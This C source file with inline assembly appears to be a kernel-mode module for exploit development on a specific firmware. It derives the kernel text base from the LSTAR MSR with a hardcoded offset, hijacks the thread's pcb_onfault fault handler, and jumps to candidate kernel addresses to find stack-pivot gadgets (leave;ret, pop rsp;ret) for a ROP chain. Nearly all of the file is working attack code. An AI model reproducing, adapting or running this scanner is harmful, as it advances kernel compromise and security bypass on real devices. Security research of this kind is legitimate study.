#include <stdint.h>

/*
 * smart_pivot_scan v13 — Fixed stack layout bug
 *
 * ROOT CAUSE OF v11/v12 PANIC:
 *   test stack had [rsp+0] = fake_stack (kdata address).
 *   When candidate is bare `ret`, it pops fake_stack into RIP
 *   → tries to EXECUTE at kdata → EPT violation → hypervisor panic.
 *
 * FIX: [rsp+0] = not_pivot_label (executable address in exec_code)
 *   - bare `ret` → jumps to not_pivot → result 0 (safe!)
 *   - pop rsp;ret → RSP=not_pivot, ret reads code bytes → page fault → result 2
 *   - leave;ret → RSP=RBP=fake_stack, pop rbp, ret → fake_stack[8]=pivot → result 1
 *   - pop rbx;ret → pop rbx=not_pivot, ret pops [rsp+8]=not_pivot → result 0
 *
 * Result encoding:
 *   0 = not a pivot (normal return through not_pivot label)
 *   1 = leave;ret pivot detected (returned through fake_stack → pivot label)
 *   2 = fault (pcb_onfault caught it; could be pop rsp;ret or other)
 *
 * SCAN_BATCH = offset to test (1-8). Default 2 = primary (B-2 = byte before ret).
 */

#ifndef SCAN_BATCH
#define SCAN_BATCH     2     /* offset 2 = byte before ret */
#endif

#define MAGIC_SPVT     0x53505654
#define N_BOUNDS       5

typedef struct {
    uint64_t kdata_base;
    uint32_t fw_ver;
} kproc_args;

static inline uint64_t rdmsr(uint32_t msr)
{
    uint32_t lo, hi;
    __asm__ volatile("rdmsr" : "=a"(lo), "=d"(hi) : "c"(msr));
    return ((uint64_t)hi << 32) | lo;
}

static volatile uint64_t g_saved_rsp;
static volatile uint64_t g_resume_rip;

__attribute__((naked))
static void fault_handler(void)
{
    __asm__ volatile(
        "movq g_saved_rsp(%%rip), %%rsp\n\t"
        "jmpq *g_resume_rip(%%rip)\n\t"
        ::: "memory"
    );
}

/*
 * Test if 'addr' behaves like a stack pivot.
 * rdi=addr, rsi=fake_stack_ptr (must be in RWX or RW memory).
 * Returns: 0=not_pivot, 1=pivot_via_leave_ret, 2=fault(possible pop_rsp_ret)
 */
__attribute__((naked, noinline))
static int test_pivot(uint64_t addr, uint64_t fake_stack_ptr)
{
    __asm__ volatile(
        "pushq %%rbx\n\t"
        "pushq %%r12\n\t"
        "pushq %%r13\n\t"
        "pushq %%r14\n\t"
        "pushq %%r15\n\t"
        "pushq %%rbp\n\t"

        /* Save RSP for fault recovery */
        "movq %%rsp, g_saved_rsp(%%rip)\n\t"

        /* fault_handler jumps here → result 2 */
        "leaq 30f(%%rip), %%rax\n\t"
        "movq %%rax, g_resume_rip(%%rip)\n\t"

        /* Fill fake_stack[0..7] with pivot_label for leave;ret detection */
        "leaq 10f(%%rip), %%rax\n\t"
        "movq %%rax,   (%%rsi)\n\t"
        "movq %%rax,  8(%%rsi)\n\t"
        "movq %%rax, 16(%%rsi)\n\t"
        "movq %%rax, 24(%%rsi)\n\t"
        "movq %%rax, 32(%%rsi)\n\t"
        "movq %%rax, 40(%%rsi)\n\t"
        "movq %%rax, 48(%%rsi)\n\t"
        "movq %%rax, 56(%%rsi)\n\t"

        /*
         * Build test stack:
         *   [rsp+0]  = not_pivot_label  ← bare `ret` pops this (SAFE: code addr!)
         *   [rsp+8]  = not_pivot_label  ← pop X; ret pops [8] if X consumed [0]
         *   [rsp+16] = not_pivot_label
         *   [rsp+24] = not_pivot_label
         *   [rsp+32] = not_pivot_label
         *   [rsp+40] = not_pivot_label
         */
        "subq $48, %%rsp\n\t"
        "leaq 20f(%%rip), %%rax\n\t"
        "movq %%rax,  (%%rsp)\n\t"
        "movq %%rax,  8(%%rsp)\n\t"
        "movq %%rax, 16(%%rsp)\n\t"
        "movq %%rax, 24(%%rsp)\n\t"
        "movq %%rax, 32(%%rsp)\n\t"
        "movq %%rax, 40(%%rsp)\n\t"

        /* RBP = fake_stack for leave;ret detection */
        "movq %%rsi, %%rbp\n\t"

        /* Jump to candidate */
        "jmpq *%%rdi\n\t"

        "10:\n\t"  /* PIVOT (reached via fake_stack → leave;ret) */
        "movq g_saved_rsp(%%rip), %%rsp\n\t"
        "movl $1, %%eax\n\t"
        "jmp 40f\n\t"

        "20:\n\t"  /* NOT PIVOT (reached via normal ret from test stack) */
        "movq g_saved_rsp(%%rip), %%rsp\n\t"
        "movl $0, %%eax\n\t"
        "jmp 40f\n\t"

        "30:\n\t"  /* FAULT (pcb_onfault caught it) */
        "movl $2, %%eax\n\t"

        "40:\n\t"
        "popq %%rbp\n\t"
        "popq %%r15\n\t"
        "popq %%r14\n\t"
        "popq %%r13\n\t"
        "popq %%r12\n\t"
        "popq %%rbx\n\t"
        "retq\n\t"
        ::: "memory"
    );
}

int module_start(kproc_args* args)
{
    uint64_t kdata_base = args->kdata_base;
    uint64_t lstar = rdmsr(0xC0000082);
    uint64_t ktext_base = lstar - 0x294218;

    volatile uint64_t* out = (volatile uint64_t*)args;
    for (int i = 0; i < 2304 / 8; i++)
        out[i] = 0;

    out[0] = ((uint64_t)0xAAAA << 32) | MAGIC_SPVT;
    out[1] = kdata_base;
    out[2] = ktext_base;

    /* pcb_onfault setup */
    uint64_t curthread;
    __asm__ volatile("movq %%gs:0, %0" : "=r"(curthread));
    uint64_t pcb = *(volatile uint64_t*)(curthread + 0x3f8);
    volatile uint64_t *onfault = (volatile uint64_t *)(pcb + 0xb0);

    /* Fake stack in scratch area (for leave;ret: RSP=RBP=fake_stack) */
    volatile uint64_t *fake_stack = &out[200];

    /* Only real function boundaries (gap ≥ 256 bytes) */
    static const uint32_t bounds[N_BOUNDS] = {
        0x00290d08, 0x00291d10, 0x002932f8, 0x0029e2d8, 0x002a0858
    };

    int offset = SCAN_BATCH;
    if (offset < 1) offset = 1;
    if (offset > 8) offset = 8;

    int n_pivots = 0, n_faults = 0;
    uint32_t result_packed = 0;

    for (int b = 0; b < N_BOUNDS; b++) {
        uint64_t addr = ktext_base + bounds[b] - (uint64_t)offset;

        /* Arm pcb_onfault */
        *onfault = (uint64_t)fault_handler;

        int r = test_pivot(addr, (uint64_t)fake_stack);

        result_packed |= ((uint32_t)(r & 0xF) << (b * 4));
        if (r == 1) n_pivots++;
        if (r == 2) n_faults++;
    }

    *onfault = 0;

    out[3] = (uint64_t)N_BOUNDS |
             ((uint64_t)offset << 16) |
             ((uint64_t)n_pivots << 32) |
             ((uint64_t)n_faults << 48);
    out[4] = result_packed;
    out[5] = ktext_base + bounds[0] - offset;
    out[6] = ktext_base + bounds[1] - offset;
    out[7] = lstar;

    out[0] = ((uint64_t)0x0001 << 32) | MAGIC_SPVT;
    return 0;
}
